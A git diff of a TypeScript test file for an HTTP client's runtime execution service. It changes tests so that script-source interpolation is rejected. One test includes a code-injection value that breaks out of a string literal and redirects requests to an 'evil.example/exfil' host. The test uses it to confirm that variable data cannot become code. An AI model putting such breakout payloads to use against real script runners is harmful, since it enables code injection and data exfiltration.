@@ -204,11 +204,61 @@ describe('RuntimeExecutionService lifecycle', () => {
       expression: 'res.body.{{missingField}}',
       expected: '{{missingExpected}}',
       description: 'Needs {{missingDescription}}',
-      message: 'Unresolved assertion variables: {{missingField}}, {{missingExpected}}, {{missingDescription}}',
+      message: 'Unresolved assertion variables: {{missingField}}, {{missingExpected}}',
     });
   });
 
-  it('evaluates runtime variable values and interpolates script source before execution', async () => {
+  it('keeps unresolved description variables cosmetic', async () => {
+    const service = new RuntimeExecutionService(async () => new Map());
+    const request: HttpRequest = {
+      http: { method: 'GET', url: 'http://127.0.0.1/runtime' },
+      runtime: {
+        assertions: [{
+          expression: 'res.body.name',
+          operator: 'equals',
+          value: 'Ada',
+          description: 'Owner {{missingDescription}}',
+        }],
+      },
+    };
+
+    const prepared = await service.prepareHttpRequest(request, makeCollection());
+    const response = await service.completeHttpRequest(prepared, makeResponse({ name: 'Ada' }));
+
+    expect(response.runtime?.success).toBe(true);
+    expect(response.runtime?.assertions[0]).toMatchObject({
+      passed: true,
+      description: 'Owner {{missingDescription}}',
+    });
+  });
+
+  it('does not re-scan placeholders introduced by resolved assertion values', async () => {
+    const service = new RuntimeExecutionService(async () => new Map([
+      ['literalExpected', '{{bar}}'],
+    ]));
+    const request: HttpRequest = {
+      http: { method: 'GET', url: 'http://127.0.0.1/runtime' },
+      runtime: {
+        assertions: [{
+          expression: 'res.body.value',
+          operator: 'equals',
+          value: '{{literalExpected}}',
+        }],
+      },
+    };
+
+    const prepared = await service.prepareHttpRequest(request, makeCollection());
+    const response = await service.completeHttpRequest(prepared, makeResponse({ value: '{{bar}}' }));
+
+    expect(response.runtime?.success).toBe(true);
+    expect(response.runtime?.assertions[0]).toMatchObject({
+      passed: true,
+      expected: '{{bar}}',
+      actual: '{{bar}}',
+    });
+  });
+
+  it('evaluates runtime variable values for the script data API before execution', async () => {
     const service = new RuntimeExecutionService(async () => new Map([
       ['owner', 'Ada'],
       ['headerSeed', 'scripted'],
@@ -229,14 +279,14 @@ describe('RuntimeExecutionService lifecycle', () => {
           {
             type: 'before-request',
             code: [
-              'missio.request.setHeader("X-Combined", "{{combined}}");',
-              'missio.request.setHeader("X-Unresolved", "{{unresolved}}");',
-              'missio.variables.set("lateHeader", "late-{{requestHeader}}");',
+              'missio.request.setHeader("X-Combined", missio.variables.get("combined"));',
+              'missio.request.setHeader("X-Unresolved", missio.variables.get("unresolved"));',
+              'missio.variables.set("lateHeader", `late-${missio.variables.get("requestHeader")}`);',
             ].join('\n'),
           },
           {
             type: 'before-request',
-            code: 'missio.request.setHeader("X-Late", "{{lateHeader}}");',
+            code: 'missio.request.setHeader("X-Late", missio.variables.get("lateHeader"));',
           },
         ],
       },
@@ -257,14 +307,14 @@ describe('RuntimeExecutionService lifecycle', () => {
     ]);
   });
 
-  it('keeps interpolated script source inside the runtime sandbox', async () => {
+  it('rejects script-source interpolation before variable data can become code', async () => {
     const service = new RuntimeExecutionService(async () => new Map([
-      ['unsafeScript', 'require("fs").readFileSync("package.json", "utf8");'],
+      ['unsafeScript', 'x"); missio.request.url = "https://evil.example/exfil"; ("'],
     ]));
     const request: HttpRequest = {
       http: { method: 'GET', url: 'http://127.0.0.1/runtime' },
       runtime: {
-        scripts: [{ type: 'before-request', code: '{{unsafeScript}}' }],
+        scripts: [{ type: 'before-request', code: 'missio.request.setHeader("X-Value", "{{unsafeScript}}");' }],
       },
     };
 
@@ -274,7 +324,8 @@ describe('RuntimeExecutionService lifecycle', () => {
     try {
       await service.prepareHttpRequest(request, makeCollection());
     } catch (error) {
-      expect((error as RuntimeExecutionError).runtime.errors[0].message).toMatch(/require is not defined/);
+      expect((error as RuntimeExecutionError).runtime.errors[0].message).toMatch(/script source interpolation is not supported/i);
+      expect((error as RuntimeExecutionError).runtime.errors[0].message).toContain('missio.variables.get("name")');
     }
   });
 
